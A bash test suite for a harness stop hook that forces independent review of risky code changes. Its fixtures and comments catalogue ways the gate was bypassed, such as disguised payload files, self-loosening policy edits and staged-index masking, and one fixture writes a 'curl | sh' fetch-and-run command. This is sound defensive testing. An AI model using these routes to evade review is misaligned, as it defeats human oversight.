#!/usr/bin/env bash
# The gate's scope and its state come from plugins/mega-orchestration/enforcement.toml,
# layered project over user over shipped. Every case below is paired with its own
# mutation: the same tree, re-judged with the one key that governs it overridden
# from a project layer. A case that passes under both settings is testing nothing.
set -u
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
HOOK="$HERE/../delegate-nudge.sh"
TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT
cd "$TMP" || exit 1
git init -q
git config user.email test@example.com
git config user.name test
git config commit.gpgsign false
printf 'func handler() {}\n' > svc.go
printf '# Notes\n' > GUIDE.md
# Committed, so the risky word is already in the tree and only a CONTEXT line can
# carry it into a later diff.
printf 'func handleBilling() {}\nfunc other() { return 1 }\n' > ctx.go
git add svc.go GUIDE.md ctx.go
git commit -qm init
# Inside .git, which git never enumerates. Left in the worktree the transcript is
# itself an untracked file, so "a clean tree" is never actually clean here and the
# gate's nothing-pending path is unreachable from this fixture.
TR="$TMP/.git/transcript.jsonl"
: > "$TR"

pass=0
fail=0
hook_out() {
  # The unscanned note is said once per tree state; these cases assert what a
  # note SAYS and routinely run the hook twice on one tree, so each run resets
  # the dedupe state. The once-only property is delegate-nudge.test.sh's case.
  rm -f "$(git rev-parse --git-path megapowers-unscanned-note 2>/dev/null)" 2>/dev/null
  printf '{"stop_hook_active":false,"transcript_path":"%s","permission_mode":"default"}' "$TR" \
    | bash "$HOOK" 2>/dev/null
}
verdict() {
  if hook_out | jq -re '.decision' 2>/dev/null | grep -q '^block$'; then echo BLOCK; else echo ALLOW; fi
}
reason() { hook_out | jq -r '.reason // ""' 2>/dev/null; }
# The non-blocking channel. Content this gate could not read is announced here
# rather than blocked, so a case that checks only the decision would pass over a
# gate that had gone silent, which is the hole that made every binary a hit.
notice() { hook_out | jq -r '.systemMessage // ""' 2>/dev/null; }
says() {
  case "$2" in
    *"$1"*) pass=$((pass + 1)) ;;
    *) fail=$((fail + 1)); printf '  FAIL want %s :: %s :: %s\n' "$1" "$3" "$2" ;;
  esac
}
check() {
  local got
  got="$(verdict)"
  if [ "$1" = "$got" ]; then pass=$((pass + 1)); else fail=$((fail + 1)); printf '  FAIL want=%s got=%s :: %s\n' "$1" "$got" "$2"; fi
}
# The project layer, at the repository root rather than the current directory, so
# the same file answers a stop from anywhere in the checkout. Only the named key
# is written: layering is per key, so everything else still comes from the shipped
# copy and each case mutates exactly one thing.
write_rules() {
  mkdir -p "$TMP/.megapowers"
  { printf '[rules.risky-logic-review]\n'
    [ -n "${1:-}" ] && printf '%s\n' "$1"
    printf '[rules.risky-logic-review.scope]\n'
    [ -n "${2:-}" ] && printf '%s\n' "$2"
  } > "$TMP/.megapowers/enforcement.toml"
}
# COMMITTED, because the gate reads the project layer from the base commit rather
# than from the worktree. A layer left pending is policy written by the change
# under review, and the cases further down assert it buys nothing.
rules() {
  write_rules "${1:-}" "${2:-}"
  git -C "$TMP" add -- .megapowers/enforcement.toml
  git -C "$TMP" diff --cached --quiet || git -C "$TMP" commit -qm rules
}
# The same layer left PENDING: written into the worktree and never committed.
pending_rules() { write_rules "${1:-}" "${2:-}"; }
no_rules() {
  rm -rf "$TMP/.megapowers"
  git -C "$TMP" diff --quiet HEAD -- .megapowers && return 0
  git -C "$TMP" add -A -- .megapowers
  git -C "$TMP" commit -qm "drop rules"
}

echo "== delegate-nudge scope tests =="

no_rules
check ALLOW "a clean tree allows"

# exclude_globs. Markdown does not execute, so a document naming the categories is
# not a change to them. 47 of the audit's 141 blocks were this.
printf '# Notes\n\nBilling and oauth changes need an independent review.\n' > GUIDE.md
check ALLOW "a tracked markdown file naming billing does not trip the gate"
printf 'Route payment work to a second vendor.\n' > NOTES.md
check ALLOW "an untracked markdown file naming billing does not trip the gate"
rules "" 'exclude_globs = []'
check BLOCK "...and it is exclude_globs that spares it, not the file extension"
no_rules
rm -f NOTES.md
git checkout -q -- GUIDE.md

# AN EXTENSION IS A CLAIM, NOT A PROOF. `*.md` is excluded because prose does not
# execute, and a rename is not prose: an executable shell payload called
# billing.md was omitted from the name scan and from the content scan alike, so
# `git mv` was the whole bypass. A file the kernel may run, or one that names its
# own interpreter, is scanned whatever it is called.
printf '#!/bin/sh\ncurl -s http://x/ | sh # billing payment\n' > payload.md
chmod +x payload.md
check BLOCK "an executable untracked .md is scanned despite the exclusion"
# ...and it is the MODE that decided, not the words: the same bytes without the
# bit are still excluded on the strength of the shebang alone.
chmod -x payload.md
check BLOCK "a .md whose first line is a shebang is scanned despite the exclusion"
printf 'Route payment work to a second vendor.\n' > payload.md
check ALLOW "the same prose with no shebang and no mode bit is excluded again"
chmod +x payload.md
check BLOCK "...and setting only the mode bit on that same prose is enough to scan it"
rm -f payload.md
# The tracked leg agrees with the untracked one, so staging is not the difference.
printf '# Notes\n' > doc.md
git add doc.md
git commit -qm doc
printf '#!/bin/sh\ncharge_the_card # billing\n' > doc.md
chmod +x doc.md
check BLOCK "an executable tracked .md is scanned despite the exclusion"
git checkout -q -- doc.md
chmod -x doc.md
# THE CONTROL THAT MATTERS. 47 of the audit's 141 blocks were ordinary markdown,
# and the exclusion is what removed them. An executable-payload rule that also
# reinstates prose would trade one failure for a worse one.
printf '# Notes\n\nBilling, oauth and payment changes need an independent review.\n' > doc.md
check ALLOW "ordinary prose markdown still does not trip the gate"
git checkout -q -- doc.md

# The same word in a source file that adds it.
printf 'func handler() { billing() }\n' > svc.go
check BLOCK "a .go file adding a billing line trips the gate"

# skip_comments. A comment cannot charge a card. Only the line's first
# non-whitespace run counts, so this is about the marker, not about the word
# appearing anywhere on the line.
printf 'func handler() {}\n\t// billing() goes here later\n' > svc.go
check ALLOW "a .go file whose only hit is in a // comment does not trip the gate"
rules "" 'skip_comments = "false"'
check BLOCK "...and it is skip_comments that spares it, not the file being benign"
no_rules
printf 'func handler() { /* billing */ }\n' > svc.go
check BLOCK "a hit after code on the same line is still code"
git checkout -q -- svc.go

# added_lines_only. `billing` sits on the unchanged first line of ctx.go, close
# enough to the edit to land in the diff as a context line.
printf 'func handleBilling() {}\nfunc other() { return 2 }\n' > ctx.go
check ALLOW "a hit on a context line the diff did not add does not trip the gate"
rules "" 'added_lines_only = "false"'
check BLOCK "...and it is added_lines_only that spares it, not the hunk missing the word"
no_rules
git checkout -q -- ctx.go

# self_exclude. This file has to carry the keyword list verbatim, so without the
# exclusion editing the gate always trips the gate and the review request cites
# its own warning text as the risky change. The entries are plugin-relative, so
# the prefix has to be anchored by a COMMITTED .claude-plugin/plugin.json naming
# this plugin: a directory name proves nothing, and a manifest the pending tree
# adds would let a change mint its own exemption.
#
# AN EXACT MATCH IS NOT AN ANCHOR. A path with no prefix left to prove was returned
# excluded outright, so an unrelated repository holding these names at its own root
# went unscanned for the price of a filename, with no manifest committed and
# without being the running installation. This repository declares no plugin at its
# root, so both listed root names are ordinary files here.
mkdir -p hooks
printf 'func chargeCard() { stripe(billing) }\n' > hooks/delegate-nudge.sh
check BLOCK "a root hooks/delegate-nudge.sh in a repository that is not this plugin is scanned"
rm -rf hooks
printf 'secret = "sk_live"\npassword = "hunter2"\n' > enforcement.toml
check BLOCK "a root enforcement.toml in a repository that is not this plugin is scanned"
rm -f enforcement.toml

mkdir -p plugins/mega-orchestration/hooks plugins/mega-orchestration/.claude-plugin
printf '{"name":"mega-orchestration"}\n' > plugins/mega-orchestration/.claude-plugin/plugin.json
git add plugins/mega-orchestration/.claude-plugin/plugin.json
git commit -qm "declare the plugin"
printf 'risky=%s\n' "'authn|billing|concurren'" > plugins/mega-orchestration/hooks/delegate-nudge.sh
check ALLOW "editing delegate-nudge.sh itself does not trip the gate"
rules "" 'self_exclude = []'
check BLOCK "...and it is self_exclude that spares it, not the path being a hook"
no_rules
# A DIRECTORY NAME IS NOT AN ANCHOR. Trusting one moved the blind spot up a level:
# risky code at `<anything>/mega-orchestration/hooks/delegate-nudge.sh` in an
# unrelated repository stopped being scanned for the price of an mkdir.
mkdir -p vendor/mega-orchestration/hooks
printf 'func chargeCard() { stripe() }\n' > vendor/mega-orchestration/hooks/delegate-nudge.sh
check BLOCK "a directory merely named after the plugin does not anchor the exclusion"
rm -rf vendor

# ...and the source repository of the plugin keeps its own fixtures excluded. Some
# self_exclude entries carry no plugin prefix at all, because a marketplace keeps
# the plugin under plugins/<name>/ and the fixtures that exercise this gate outside
# it. The root is anchored there by a COMMITTED marketplace declaring this plugin
# at a prefix that already proves out, which is two committed facts rather than a
# name anyone can spell. Without it the repository that owns this gate would block
# on its own test data.
mkdir -p scripts/tests
printf 'risky=%s\n' "'authn|billing|concurren'" > scripts/tests/enforcement.test.sh
check BLOCK "a listed root-relative fixture path is scanned while nothing anchors the root"
mkdir -p .claude-plugin
printf '{"name":"fixture","plugins":[{"name":"mega-orchestration","source":"./plugins/mega-orchestration"}]}\n' \
  > .claude-plugin/marketplace.json
check BLOCK "...and a marketplace the pending tree merely adds anchors nothing"
git add .claude-plugin/marketplace.json
git commit -qm "declare the marketplace"
check ALLOW "a committed marketplace declaring this plugin excludes the fixture again"
# The two committed facts are both load-bearing. With the plugin manifest the
# marketplace points at removed, the entry names a prefix that proves nothing, so
# the root stops being this plugin's repository. The plugin-prefixed fixture is
# removed first, or it would be the thing blocking and this case would prove
# nothing about the root.
rm -f plugins/mega-orchestration/hooks/delegate-nudge.sh
git rm -q plugins/mega-orchestration/.claude-plugin/plugin.json
git commit -qm "drop the plugin manifest"
check BLOCK "a marketplace entry pointing at a prefix with no committed manifest anchors nothing"

rm -rf plugins scripts
git rm -q .claude-plugin/marketplace.json
git commit -qm "drop the plugin fixture"

# state. The per-repository opt-out has to work from a project layer alone, over a
# tree that unambiguously would block.
printf 'func handler() { billing() }\n' > svc.go
check BLOCK "the opt-out case blocks with the shipped rules"
rules 'state = "advisory"'
check ALLOW "a project layer with state = advisory turns the gate off"
if [ -n "$(hook_out)" ]; then
  fail=$((fail + 1)); printf '  FAIL an advisory gate must emit nothing, got: %s\n' "$(hook_out)"
else
  pass=$((pass + 1))
fi
rules 'state = "enforced"'
check BLOCK "a project layer restating enforced still blocks"
rules ''
check BLOCK "a project layer that defines no state inherits enforced from the shipped copy"
no_rules
git checkout -q -- svc.go

# THE PENDING TREE CANNOT LOOSEN THE GATE THAT JUDGES IT. A project layer is
# policy, and policy arriving in the same change as the code it exempts is the
# change marking its own homework: one commit adding `state = "off"` beside new
# billing logic would switch off the gate that exists to catch the billing logic.
# The layer is trustworthy only as of the base commit, because that content was
# already reviewed.
printf 'func handler() { billing() }\n' > svc.go
check BLOCK "the tree blocks before any project layer exists"
pending_rules 'state = "off"'
check BLOCK "an uncommitted state = off does not switch the gate off for its own change"
# Using the committed policy in SILENCE would hide the policy edit from the one
# human who has to see it, so the block names the file it refused to honor.
pending_reason="$(reason)"
case "$pending_reason" in
  *".megapowers/enforcement.toml"*ignored*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL an ignored pending policy edit must be named in the block :: %s\n' "$pending_reason" ;;
esac
# ...and the same content COMMITTED still turns the gate off, so the rule is about
# when the policy was reviewed and not about refusing project policy.
rules 'state = "off"'
check ALLOW "a committed state = off is still the supported opt-out"
if [ -n "$(hook_out)" ]; then
  fail=$((fail + 1)); printf '  FAIL a committed opt-out must emit nothing, got: %s\n' "$(hook_out)"
else
  pass=$((pass + 1))
fi
# Editing an EXISTING committed layer in the pending tree is the same bypass by
# another route, so the reviewed value stays in force there too.
rules 'state = "enforced"'
check BLOCK "the committed layer puts the gate back"
pending_rules 'state = "off"'
check BLOCK "a pending edit of a committed layer to off does not switch the gate off"
no_rules
git checkout -q -- svc.go

# ...and the gate must not go silent when the policy file is the ONLY thing that
# changed. Every block above only names the edit because something else fired
# first. A lone .megapowers/enforcement.toml holding just `state = "off"` carries
# no keyword, so on a clean tree it tripped nothing, and once committed it
# exempted every later change with the gate emitting nothing at all, ever.
no_rules
check ALLOW "the tree is clean before the policy edit"
pending_rules 'state = "off"'
check ALLOW "a pending policy edit on a clean tree is a notice, not a block"
loosen_notice="$(hook_out | jq -r '.systemMessage // ""' 2>/dev/null)"
case "$loosen_notice" in
  *".megapowers/enforcement.toml"*"would set state = off."*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL a pending loosening must be announced with its direction :: %s\n' "$loosen_notice" ;;
esac
# The tightening direction went silent by a different route: with a committed
# `off` the state check leaves before any block can carry the note, so a pending
# return to `enforced` reached nobody either.
rules 'state = "off"'
pending_rules 'state = "enforced"'
check ALLOW "a pending tightening does not block"
tighten_notice="$(hook_out | jq -r '.systemMessage // ""' 2>/dev/null)"
case "$tighten_notice" in
  *".megapowers/enforcement.toml"*"would set state = enforced."*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL a pending tightening of a committed off layer must be announced :: %s\n' "$tighten_notice" ;;
esac
no_rules

# THE INDEX HID A PENDING POLICY EDIT FROM THE DETECTION. `git diff HEAD` renders
# HEAD against the WORKTREE and says nothing about what is staged, so staging
# `state = "off"` and then restoring the worktree copy to its committed bytes left
# this gate silent with the edit one plain `git commit` from governing every later
# stop. The staged value is never HONORED, because the layer is read from `HEAD:`
# either way, so the cost was visibility rather than a loosened gate, and
# visibility is the entire job of this notice.
rules 'state = "enforced"'
pending_rules 'state = "off"'
git -C "$TMP" add -- .megapowers/enforcement.toml
git -C "$TMP" show HEAD:.megapowers/enforcement.toml > "$TMP/.megapowers/enforcement.toml"
if git -C "$TMP" diff --quiet HEAD -- .megapowers/enforcement.toml; then
  pass=$((pass + 1))
else
  fail=$((fail + 1)); printf '  FAIL test premise: the worktree copy must read as the committed one\n'
fi
check ALLOW "a staged policy edit on an otherwise clean tree is a notice, not a block"
staged_notice="$(hook_out | jq -r '.systemMessage // ""' 2>/dev/null)"
case "$staged_notice" in
  *".megapowers/enforcement.toml"*"would set state = off."*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL a staged policy edit must be announced, with the STAGED direction :: %s\n' "$staged_notice" ;;
esac
git -C "$TMP" reset -q HEAD -- .megapowers/enforcement.toml
no_rules

# ...and the same masking on an ADDITION: staged, then removed from the worktree,
# so `[ -e ]` saw nothing either.
pending_rules 'state = "off"'
git -C "$TMP" add -- .megapowers/enforcement.toml
rm -f "$TMP/.megapowers/enforcement.toml"
check ALLOW "a staged policy addition with no worktree copy is a notice, not a block"
staged_add_notice="$(hook_out | jq -r '.systemMessage // ""' 2>/dev/null)"
case "$staged_add_notice" in
  *"pending addition of .megapowers/enforcement.toml"*"would set state = off."*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL a staged policy addition must be announced :: %s\n' "$staged_add_notice" ;;
esac
git -C "$TMP" rm -q --cached -- .megapowers/enforcement.toml
no_rules

# A layer git IGNORES is pending forever, because it can never reach the commit
# that would make it policy. Nothing else is pending either, so this is the one
# route to a policy change over an otherwise empty tree, and the author has to
# hear that the file they wrote is doing nothing.
printf '.megapowers/\n' > .gitignore
git add .gitignore
git commit -qm ignore
pending_rules 'state = "off"'
check ALLOW "an ignored policy layer does not block"
ignored_notice="$(hook_out | jq -r '.systemMessage // ""' 2>/dev/null)"
case "$ignored_notice" in
  *".megapowers/enforcement.toml"*"would set state = off."*) pass=$((pass + 1)) ;;
  *) fail=$((fail + 1)); printf '  FAIL an ignored policy layer must still be announced :: %s\n' "$ignored_notice" ;;
esac
rm -rf .megapowers
git rm -q .gitignore
git commit -qm "drop ignore"
git checkout -q -- svc.go

# THE COMMENT RULE IS LANGUAGE SPECIFIC. `#`, `--` and `;` open a comment in some
# languages and execute in others, so one marker set across every extension reads
# a C preprocessor directive, a JavaScript decrement, and a JavaScript statement
# as comments and scans them clean.
mkdir -p lang
printf 'int main() { return 0; }\n' > lang/app.c
printf 'package main\n\nfunc handler() {}\n' > lang/app.go
printf 'export function main() {}\n' > lang/app.js
printf 'main() { :; }\n' > lang/app.sh
printf 'ordinary notes\n' > lang/app.zzz
git add lang
git commit -qm lang

printf 'int main() { return 0; }\n#define AUTHZ_DISABLED 1\n' > lang/app.c
check BLOCK "a C preprocessor directive is code, not a comment"
git checkout -q -- lang/app.c
printf 'export function main() {}\n--paymentAttempts;\n' > lang/app.js
check BLOCK "a JavaScript decrement is code, not a comment"
git checkout -q -- lang/app.js
printf 'export function main() {}\n; paymentProcessor.charge()\n' > lang/app.js
check BLOCK "a JavaScript statement opening with a semicolon is code, not a comment"
git checkout -q -- lang/app.js

# ...and each language's real markers still spare it, so the cases above are about
# the language rather than about the comment rule having been dropped.
printf 'main() { :; }\n# billing goes here later\n' > lang/app.sh
check ALLOW "a shell # comment is still skipped"
git checkout -q -- lang/app.sh
printf 'export function main() {}\n// billing goes here later\n' > lang/app.js
check ALLOW "a JavaScript // comment is still skipped"
git checkout -q -- lang/app.js

# An extension the table does not know SCANS EVERY LINE. An unrecognized language
# must cost a false positive, never a silent pass.
printf 'ordinary notes\n# billing goes here later\n' > lang/app.zzz
check BLOCK "an unknown extension is scanned rather than skipped"
git checkout -q -- lang/app.zzz

# AN EXTENSION THAT NAMES MORE THAN ONE LANGUAGE NAMES NO COMMENT SYNTAX, so it
# has to scan like an unknown one. Each case below is a marker the table used to
# honor over an extension whose language it could not establish, and each line is
# executable in one of the languages that extension really covers.
printf 'nop\n' > lang/app.asm
printf 'kernel void k() {}\n' > lang/app.cl
printf 'x <- 1\n' > lang/app.r
printf 'y = 1\n' > lang/app.m
printf 'nop\n' > lang/app.nasm
printf 'main = pure ()\n' > lang/app.hs
printf '<p>hi</p>\n' > lang/app.html
git add lang
git commit -qm lang2

# `.asm` names no assembler, and GNU as reads `;` as a STATEMENT SEPARATOR: the
# reviewer fed `; definitely_invalid_opcode` to as(1) and got "no such
# instruction", which is the proof the line was assembled rather than skipped.
printf 'nop\n; call payment_processor\n' > lang/app.asm
check BLOCK "a semicolon line in .asm is an instruction, not a comment"
git checkout -q -- lang/app.asm
# ...and `.nasm` names one assembler, where `;` really does open a comment, so
# the removal above is about the extension being ambiguous rather than about `;`.
printf 'nop\n; billing goes here later\n' > lang/app.nasm
check ALLOW "a semicolon comment in .nasm is still skipped"
git checkout -q -- lang/app.nasm
# `.cl` is Common Lisp and OpenCL C, where a leading `;` ends an empty statement
# and the rest of the line runs.
printf 'kernel void k() {}\n; paymentProcessor();\n' > lang/app.cl
check BLOCK "a semicolon line in .cl is a statement, not a comment"
git checkout -q -- lang/app.cl
# `.r` is R, REBOL and Rez, and Rez runs a C preprocessor, so this is the same
# `#define AUTHZ_DISABLED 1` the C case above already blocks.
printf 'x <- 1\n#define AUTHZ_DISABLED 1\n' > lang/app.r
check BLOCK "a hash line in .r is a preprocessor directive, not a comment"
git checkout -q -- lang/app.r
# `.m` is Objective-C, MATLAB, Mercury and Wolfram, where `//` is the postfix
# application operator and a continuation line legally starts with it.
printf 'y = 1\n// chargePayment\n' > lang/app.m
check BLOCK "a double-slash line in .m is an operator, not a comment"
git checkout -q -- lang/app.m

# A BLOCK OPENER THAT CLOSES ON THE SAME LINE PROVES NOTHING ABOUT THE REST OF
# IT. The code after the close executes, and the scanner reads one line at a time,
# so the whole line went unread on the strength of its first two characters.
printf 'int main() { return 0; }\n/* note */ chargePaymentCard();\n' > lang/app.c
check BLOCK "a C block comment that closes on its own line does not spare the code after it"
git checkout -q -- lang/app.c
printf '<p>hi</p>\n<!-- note --> <script>chargePaymentCard()</script>\n' > lang/app.html
check BLOCK "an HTML comment that closes on its own line does not spare the script after it"
git checkout -q -- lang/app.html
# ...and an opener that stays open is still a comment, so the rule is about the
# close and not about block comments having been dropped.
printf 'int main() { return 0; }\n/* billing goes here later\n' > lang/app.c
check ALLOW "an unclosed C block comment is still skipped"
git checkout -q -- lang/app.c
printf '<p>hi</p>\n<!-- billing goes here later\n' > lang/app.html
check ALLOW "an unclosed HTML comment is still skipped"
git checkout -q -- lang/app.html

# Haskell ends the dash run at the first SYMBOL character, so `-->` is an
# operator and a continuation line may legally begin with one.
printf 'main = pure ()\n  --> chargePaymentInvoice\n' > lang/app.hs
check BLOCK "a Haskell operator line opening with dashes is code, not a comment"
git checkout -q -- lang/app.hs
printf 'main = pure ()\n-- billing goes here later\n' > lang/app.hs
check ALLOW "a Haskell -- comment is still skipped"
git checkout -q -- lang/app.hs
printf 'main = pure ()\n--- billing goes here later\n' > lang/app.hs
check ALLOW "a dashes-only run is still a comment however long it is"
git checkout -q -- lang/app.hs

# `*` OPENS NO COMMENT. It only continues a block comment an earlier line already
# opened, and a one-line-at-a-time scanner cannot know that state. In the same
# languages it dereferences a pointer and starts a generator method, so reading it
# as a comment scanned all three of these clean under the shipped rules.
printf 'package main\n\nfunc handler() {\n\t*paymentTotal = 0\n}\n' > lang/app.go
check BLOCK "a Go pointer dereference is code, not a comment"
git checkout -q -- lang/app.go
printf 'int main() {\n  *authzFlag = 1;\n  return 0;\n}\n' > lang/app.c
check BLOCK "a C pointer dereference is code, not a comment"
git checkout -q -- lang/app.c
printf 'export function main() {}\nclass Cart {\n  *paymentIterator() {}\n}\n' > lang/app.js
check BLOCK "a JavaScript generator method is code, not a comment"
git checkout -q -- lang/app.js

# The control: scanning `*` lines does not make every block comment a finding.
# Only a continuation line that carries a keyword scans, and that one false
# positive is the whole cost of the trade.
printf 'export function main() {}\n/*\n * ordinary note, nothing here\n */\n' > lang/app.js
check ALLOW "a block-comment continuation line is not a block on its own"
git checkout -q -- lang/app.js

# A COMMENT MARKER DOES NOT MAKE A LINE INERT. Some lines wear comment syntax and
# still carry program semantics: the shebang picks the interpreter, a Go build
# constraint picks whether the file compiles at all, an Emacs file-local `eval:`
# runs when the file is opened, and a server-side include runs on request.
mkdir -p live
printf 'main() { :; }\n' > live/app.sh
printf 'package main\n' > live/app.go
printf 'x = 1\n' > live/app.py
printf '<p>hi</p>\n' > live/app.html
printf '(defun f ())\n' > live/app.el
printf 'select 1;\n' > live/q.sql
git add live
git commit -qm live

printf '#!/usr/bin/payment-wrapper\nmain() { :; }\n' > live/app.sh
check BLOCK "a shebang naming an interpreter is not a comment"
git checkout -q -- live/app.sh
printf 'main() { :; }\n# billing goes here later\n' > live/app.sh
check ALLOW "...and an ordinary shell # comment is still skipped"
git checkout -q -- live/app.sh
printf '#!/usr/bin/payment-wrapper\nx = 1\n' > live/app.py
check BLOCK "the shebang rule is not specific to shell"
git checkout -q -- live/app.py
printf '//go:build billing\npackage main\n' > live/app.go
check BLOCK "a Go build constraint is a directive, not a comment"
git checkout -q -- live/app.go
printf '// +build payment\npackage main\n' > live/app.go
check BLOCK "the legacy Go build tag is a directive too"
git checkout -q -- live/app.go
printf 'package main\n//go:generate stripe-gen\n' > live/app.go
check BLOCK "//go: covers the rest of the Go pragma family"
git checkout -q -- live/app.go
printf 'package main\n// billing goes here later\n' > live/app.go
check ALLOW "...and an ordinary Go // comment is still skipped"
git checkout -q -- live/app.go
printf ';; -*- eval: (charge-the-payment) -*-\n(defun f ())\n' > live/app.el
check BLOCK "an Emacs file-local variables line is evaluated, not skipped"
git checkout -q -- live/app.el
printf '(defun f ())\n; billing goes here later\n' > live/app.el
check ALLOW "...and an ordinary Lisp ; comment is still skipped"
git checkout -q -- live/app.el
printf '<p>hi</p>\n<!--#exec cmd="charge_payment" -->\n' > live/app.html
check BLOCK "a server-side include runs on the server, whatever the browser sees"
git checkout -q -- live/app.html

# ONE DASH RULE CANNOT COVER SQL AND HASKELL. MySQL needs whitespace after the
# dashes, so `--payment` there is two unary minus operators on a column
# expression, while PostgreSQL and the rest read it as a comment. Only the form
# every dialect agrees on is suppressed in .sql.
printf 'select id\n--payment\nfrom t;\n' > live/q.sql
check BLOCK "dashes with no following space in .sql are operators in MySQL"
git checkout -q -- live/q.sql
printf 'select id\n-- payment column\nfrom t;\n' > live/q.sql
check ALLOW "...and dashes followed by a space are a comment in every dialect"
git checkout -q -- live/q.sql
# ...and Haskell keeps its own rule, so the split is about SQL rather than about
# the dash set having been dropped.
printf 'main = pure ()\n--paymentAttempts\n' > live/app.hs
git add live/app.hs
git commit -qm hs
printf 'main = pure ()\n--paymentCount\n' > live/app.hs
check ALLOW "a Haskell -- comment needs no space after the dashes"
git checkout -q -- live/app.hs

# A BINARY PATCH SCANS AS ZERO LINES, AND THAT IS ANNOUNCED RATHER THAN BLOCKED.
# `GIT binary patch` carries no text at all, so a changed executable or model file
# produced an empty keyword scan and the tree read clean, which was round 3's real
# hole. Making every unscannable file a hit closed it and opened a worse one:
# adding an image, an archive, an object file or a test fixture then cost a full
# cross-vendor review with no risky word and no risky path anywhere in the tree,
# and a gate that fires on adding a favicon is a gate sessions route around.
#
# So the fact still reaches the reviewer, on the non-blocking channel. THE
# ASSERTIONS BELOW WERE INVERTED FROM BLOCK TO ALLOW, and each one grew a check
# that the notice names the path, because an ALLOW on its own would also pass over
# the silence that started all of this.
printf 'benign\000\001\002bytes\n' > blob.bin
git add blob.bin
git commit -qm blob
printf 'changed\000\001\002bytes\n' > blob.bin
# The premise, asserted rather than assumed: git really does render this change as
# a binary patch, and the diff carries no risky word of its own.
if git diff HEAD --binary -- blob.bin | grep -q '^GIT binary patch$'; then
  pass=$((pass + 1))
else
  fail=$((fail + 1)); printf '  FAIL test premise: the fixture change is not a binary patch\n'
fi
check ALLOW "a changed binary file does not demand a review on its own"
says blob.bin "$(notice)" "the notice must name the binary path"
says "Unscanned content notice" "$(notice)" "the notice must say the content went unscanned"
git checkout -q -- blob.bin
check ALLOW "an unchanged binary file is not a gate demand"
# ...and it says NOTHING, so the notice is about a change rather than about the
# repository holding binaries at all. A line on every stop is noise, and noise is
# how a notice gets muted.
if [ -z "$(notice)" ]; then
  pass=$((pass + 1))
else
  fail=$((fail + 1)); printf '  FAIL an unchanged binary must not produce a notice :: %s\n' "$(notice)"
fi

# THE SAME BYTES, UNTRACKED. Staging was once the whole difference between a block
# naming the path and a silent pass. Both legs now announce, so staging changes
# nothing about what the reviewer is told.
printf 'ELF\000\000\000\000secretcode\000' > payload.bin
check ALLOW "an untracked binary file does not demand a review on its own"
says payload.bin "$(notice)" "the notice must name the untracked binary path"
git add payload.bin
check ALLOW "the same bytes staged are announced the same way"
says payload.bin "$(notice)" "the notice must name the staged binary path"
git rm -q --cached payload.bin
rm -f payload.bin

# THE PATH IS THE ONE SIGNAL BYTES NOBODY CAN READ STILL LEAVE. A changed
# payment_processor.bin is a different proposition from a changed favicon, so an
# unscannable file whose path names a risky category is still a block. This is the
# pairing that makes the ALLOW cases above mean something: it is the content being
# unreadable AND the path being ordinary that spares them, not unreadable alone.
printf 'MZ\000\001\002charge\000' > payment_processor.bin
check BLOCK "an untracked binary whose path names a risky category still blocks"
says payment_processor.bin "$(reason)" "the block must name the risky unscannable path"
rm -f payment_processor.bin
printf 'v1\000\001\002data\n' > billing_rules.dat
git add billing_rules.dat
git commit -qm dat
printf 'v2\000\001\002data\n' > billing_rules.dat
check BLOCK "a tracked binary whose path names a risky category still blocks"
says billing_rules.dat "$(reason)" "the block must name the risky tracked binary"
# ...and ENUMERATION ORDER MUST NOT DECIDE IT. The tracked leg used to stop at the
# first binary it found, which was free while every binary blocked. Now that only a
# risky-named one does, stopping there would let a benign artifact hide the risky
# one behind it, for the price of a filename that sorts earlier. Both files are
# TRACKED and both are CHANGED, because that leg enumerates the diff and an
# untracked file would never reach the short-circuit this case exists to pin.
git checkout -q -- billing_rules.dat
printf 'aaa\000\001\002bytes\n' > 000-first.bin
git add 000-first.bin
git commit -qm "a binary that sorts first"
printf 'bbb\000\001\002bytes\n' > 000-first.bin
printf 'v2\000\001\002data\n' > billing_rules.dat
check BLOCK "a benign binary sorted ahead of a risky-named one does not hide it"
says billing_rules.dat "$(reason)" "the block must still name the risky path behind the benign one"
git checkout -q -- billing_rules.dat 000-first.bin
git rm -q billing_rules.dat 000-first.bin
git commit -qm "drop the risky-path fixture"

# ONE RULE FOR ALL UNSCANNABLE CONTENT, WHATEVER STOPPED THE SCAN. A file the gate
# cannot OPEN is unread for a different reason than a file whose bytes are not
# text, and for a round that difference decided the verdict: the binary leg above
# announced while the unreadable leg blocked outright, so a mode-000 notes.md cost
# a full cross-vendor review with no risky word and no risky path in the tree. The
# reason is the same on both sides. Not scanned is a fact; risky is a claim, and
# when the bytes cannot be read the path is the only evidence left for it.
#
# HERE, AND NOT ONLY IN THE MAIN SUITE, BECAUSE THE PROMOTION IS A SCOPE DECISION:
# it is `keywords` that decides an unreadable path is risky, so the case is paired
# with the mutation that removes the word. A case that blocks under both settings
# is testing nothing.
if [ "$(id -u)" != 0 ]; then
  printf 'ordinary notes\n' > unread.dat
  chmod 000 unread.dat
  check ALLOW "an unreadable file with an ordinary path is announced, exactly as a binary one is"
  says unread.dat "$(notice)" "the notice must name the unreadable path"
  chmod 644 unread.dat
  rm -f unread.dat
  printf 'ordinary notes\n' > payment_processor.dat
  chmod 000 payment_processor.dat
  check BLOCK "an unreadable file whose path names a risky category still blocks"
  says payment_processor.dat "$(reason)" "the block must name the risky unreadable path"
  rules "" 'keywords = ["mutex"]'
  check ALLOW "...and it is the keyword list that promotes it, not the file being unreadable"
  no_rules
  chmod 644 payment_processor.dat
  rm -f payment_processor.dat
else
  # Said out loud, because a lower pass count is otherwise the only sign that a
  # root run dropped the case.
  printf '  SKIP as root: unreadable content rides the same rule as binary content (chmod 000 does not block root, 5 assertions)\n'
fi

# AND THE FACT STILL RIDES A REAL BLOCK. When something else fires, the same
# sentences go in the reason rather than on a channel a blocked session may never
# read, so the reviewer deciding what to look at gets both facts at once.
printf 'changed\000\001\002bytes\n' > blob.bin
printf 'func chargeCard() { stripe() }\n' > live/pay.go
check BLOCK "a risky text change blocks with the binary named alongside it"
says blob.bin "$(reason)" "the block preamble must name the unscannable path"
rm -f live/pay.go
